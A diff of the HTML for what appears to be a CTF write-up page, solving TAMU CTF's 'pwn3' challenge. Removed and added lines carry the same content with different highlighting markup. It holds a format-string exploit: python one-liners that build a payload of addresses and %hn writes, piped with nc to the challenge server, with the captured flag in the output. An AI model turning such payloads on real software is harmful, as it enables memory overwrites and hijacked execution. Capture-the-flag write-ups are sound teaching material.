-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;\x1e\xa0\x04\x08&#34; + &#34;addr2&#34; + &#34;%2044x&#34; + &#34;%4$hn&#34; + &#34;%____x&#34; + &#34;%_$hn&#34;)&#39;</span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1e\xa0\x04\x08&quot; + &quot;addr2&quot; + &quot;%2044x&quot; + &quot;%4$hn&quot; + &quot;%____x&quot; + &quot;%_$hn&quot;)&#39;</span>
+</code></pre></div>
+
 <p>The second value to be written is the biggest one <code>0x85ab - (2044 + 8) = 32167</code> in the address <code>0804a01c</code> which will be stored in the <code>5th</code> position of the stack.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;\x1e\xa0\x04\x08&#34; + &#34;\x1c\xa0\x04\x08&#34; + &#34;%2044x&#34; + &#34;%4$hn&#34; + &#34;%32167x&#34; + &#34;%5$hn&#34;)&#39;</span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1e\xa0\x04\x08&quot; + &quot;\x1c\xa0\x04\x08&quot; + &quot;%2044x&quot; + &quot;%4$hn&quot; + &quot;%32167x&quot; + &quot;%5$hn&quot;)&#39;</span>
+</code></pre></div>
+
 <p>Finally! lets try it!</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;\x1e\xa0\x04\x08&#34; + &#34;\x1c\xa0\x04\x08&#34; + &#34;%2044x&#34; + &#34;%4$hn&#34; + &#34;%32167x&#34; + &#34;%5$hn&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4323</span><span class="">
-</span><span class="">                                                                                                                                                                                                                                      0This </span><span class="k">function</span><span class=""> has been deprecated
-</span><span class="">gigem</span><span class="o">{</span><span class="">F0RM@1NG_1S_H4RD</span><span class="o">}</span><span class="">
-</span><span class="">
-</span><span class="">Segmentation fault</span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1e\xa0\x04\x08&quot; + &quot;\x1c\xa0\x04\x08&quot; + &quot;%2044x&quot; + &quot;%4$hn&quot; + &quot;%32167x&quot; + &quot;%5$hn&quot;)&#39;</span> <span class="p">|</span> nc pwn.ctf.tamu.edu <span class="m">4323</span>
+                                                                                                                                                                                                                                      0This <span class="k">function</span> has been deprecated
+gigem<span class="o">{</span>F0RM@1NG_1S_H4RD<span class="o">}</span>
+
+Segmentation fault
+</code></pre></div>
+
 <p>Answer: gigem{F0RM@1NG_1S_H4RD}</p>
 
 <h3 id="complete-video">Complete video</h3>
@@ -392,8 +408,9 @@ Let&rsquo;s represent this.</p>
 </ul>
 
 <h4 id="some-notes-for-the-author">Some notes for the author</h4>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ r2 -R </span><span class="s2">&#34;stdin=\&#34;`python -c &#39;print(\&#34;\x1e\xa0\x04\x08\x1c\xa0\x04\x08\&#34; + \&#34;%2044x%4</span><span class="nv">$hn</span><span class="s2">\&#34; + \&#34;%32167x%5</span><span class="nv">$hn</span><span class="s2">\&#34;)&#39;`\&#34;&#34;</span><span class=""> -d pwn3</span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ r2 -R <span class="s2">&quot;stdin=\&quot;`python -c &#39;print(\&quot;\x1e\xa0\x04\x08\x1c\xa0\x04\x08\&quot; + \&quot;%2044x%4</span><span class="nv">$hn</span><span class="s2">\&quot; + \&quot;%32167x%5</span><span class="nv">$hn</span><span class="s2">\&quot;)&#39;`\&quot;&quot;</span> -d pwn3
+</code></pre></div>
+
                     </div>
                     <div class="hmdl-page-comments mdl-color-text--primary-contrast mdl-card__supporting-text comments"> 
                         <strong>
